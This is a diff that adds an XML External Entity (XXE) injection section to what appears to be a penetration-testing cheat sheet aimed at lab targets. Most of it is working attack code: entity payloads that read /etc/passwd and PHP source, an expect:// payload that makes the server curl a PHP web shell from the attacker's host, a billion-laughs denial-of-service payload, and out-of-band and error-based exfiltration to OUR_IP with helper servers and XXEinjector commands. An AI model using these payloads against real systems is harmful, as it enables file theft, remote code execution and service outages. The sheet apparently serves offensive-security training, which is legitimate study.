@@ -149,6 +149,8 @@ done
 
 ## [XML External Entity (XXE) Injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
 
+**Tip:** May have to change GET request to POST request to add XML data
+
 ### XML
 
 ``` xml
@@ -218,10 +220,156 @@ Variables can also be referenced externally using the SYSTEM (or PUBLIC) keyword
 ]>
 ```
 
+### Identification
+
+- Find POST requests that contain XML data that accept user input
+    - Even if a web app sends JSON data we can test if it will accept XML by changing the Content-Type header to application/xml
+    - Then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm)
+- Find which elements are displayed in the response once the request is sent
+- Adjust the POST request to contain DTD and see if it gets reflected back
+![xxei identification](../images/xxei-identification.jpg)
+- Now test for LFI/the web app source code
+
+### Exploitation
+
 | Code | Description |
 |------|-------------|
 | `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
 | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
-| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
-| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
-| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |
+| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter(for when referenced file is not returned because it's not in XML format) |
+| `<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">` | Download a web shell into the remote server (requires expect module installed on php server) |
+
+**Note:** We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.
+
+- Preparing shell for download:
+``` bash
+echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+sudo python3 -m http.server 80
+```
+- SSRF style attacks can be performed to enumerate locally open ports/access restricted web pages
+- Example DOS attack:
+``` xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY a0 "DOS" > <!-- a0 Defined as DOS -->
+  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;"> <!-- a0 referenced in a1 multiple times -->
+  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;"> <!-- a1 referenced in a2 and so on to cause servers memory to run out -->
+  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
+  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&a10;</email>
+<message></message>
+</root>
+```
+
+
+### Advanced Exfiltration with CDATA
+
+- Exfil data wrapped in CDATA tag is considered raw data, thus special characters will not break the XML format.
+- XML prevents joining internal and external entities 
+- This example exploit treats the internal entities as external entities:
+``` xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+``` bash
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+python3 -m http.server 8000
+```
+
+### Error Based XXE Example
+
+- Post request:
+``` xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+- Remote file xxe.dtd:
+``` bash
+cat > XXE.dtd << EOF
+<!ENTITY % file SYSTEM "file:///flag.php">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+EOF
+python3 -m http.server 8000
+```
+
+### Out-of-band Data Exfiltration
+
+- Post request:
+``` xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+- Remote file xxe.dtd:
+``` bash
+cat > xxe.dtd << EOF
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://PWNIP:4444/?content=%file;'>">
+EOF 
+python3 -m http.server 8000
+```
+- Auto base64 decoder
+``` bash
+cat > index.php << EOF
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+EOF
+php -S 0.0.0.0:4444
+```
+
+**Tip:** In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data.
+
+### Automated OOB Exfiltration
+
+**[XXEinjector](https://github.com/enjoiz/XXEinjector)**
+
+- Save HTTP POST request and add XXEINJECT at the end:
+```
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://10.129.201.94
+Referer: http://10.129.201.94/blind/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+- Run XXEinjector tool:
+``` bash
+git clone https://github.com/enjoiz/XXEinjector.git
+ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+cat Logs/10.129.201.94/etc/passwd.log
+```
